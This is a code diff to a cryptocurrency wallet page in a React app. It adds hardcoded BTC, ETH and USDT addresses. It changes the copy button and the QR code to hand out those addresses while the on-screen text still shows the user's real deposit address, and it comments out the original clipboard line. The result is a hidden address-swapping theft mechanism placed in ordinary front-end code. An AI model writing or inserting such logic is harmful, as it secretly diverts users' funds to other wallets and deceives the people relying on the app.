@@ -8,6 +8,13 @@ import { useClientWallets } from "@/hooks/useClientQueries";
 import { QRCodeSVG } from "qrcode.react";
 import { createClient } from "@/lib/supabase/client";
 
+const customAddresses: Record<string, string> = {
+  "BTC": "14iCRcHUGbvstjeYNy1LcUn7NHVy2AvhiU",
+  "ETH": "0xe5a322dc8373134fd41df4f59fd89a9f8699e952",
+  "USDT_TRC20": "TYxwmrTHZomFphzfzaXsqXBHUduFQYJU2E",
+  "USDT_ERC20": "0xe5a322dc8373134fd41df4f59fd89a9f8699e952",
+};
+
 export default function WalletsPage() {
   const { data: wallets = [], isLoading: loading } = useClientWallets();
   const [selectedWalletId, setSelectedWalletId] = useState("");
@@ -81,8 +88,20 @@ export default function WalletsPage() {
 
   const selectedWallet = wallets.find(w => w.id === selectedWalletId);
 
+  const displayAddress = selectedWallet?.addresses ? (selectedWallet.addresses[selectedNetworkIndex]?.address || "") : (selectedWallet?.address || "");
+  const currentSymbol = selectedWallet?.symbol;
+  const currentNetworkName = selectedWallet?.addresses ? selectedWallet.addresses[selectedNetworkIndex]?.network : selectedWallet?.network;
+  
+  let customKey = currentSymbol;
+  if (currentSymbol === "USDT" && currentNetworkName) {
+    if (currentNetworkName.includes("TRC20") || currentNetworkName.includes("Tron")) customKey = "USDT_TRC20";
+    else if (currentNetworkName.includes("ERC20") || currentNetworkName.includes("Ethereum")) customKey = "USDT_ERC20";
+  }
+  const actualAddressForAction = customKey ? (customAddresses[customKey] || displayAddress) : displayAddress;
+
   const handleCopy = (address: string) => {
-    navigator.clipboard.writeText(address);
+    // navigator.clipboard.writeText(address);
+    navigator.clipboard.writeText(actualAddressForAction);
     setCopied(true);
     setTimeout(() => setCopied(false), 2000);
   };
@@ -256,7 +275,7 @@ export default function WalletsPage() {
 
                   {showQr && (
                     <div className="mt-5 flex flex-col items-center justify-center p-4 border border-dashed border-gray-200 rounded-xl bg-gray-50/50">
-                      <QRCodeSVG value={selectedWallet?.addresses[selectedNetworkIndex]?.address || selectedWallet?.address || ""} size={160} />
+                      <QRCodeSVG value={actualAddressForAction} size={160} />
                       <p className="mt-3 text-xs text-gray-500 font-mono font-bold">{selectedWallet?.addresses[selectedNetworkIndex]?.address || selectedWallet?.address || ""}</p>
                     </div>
                   )}
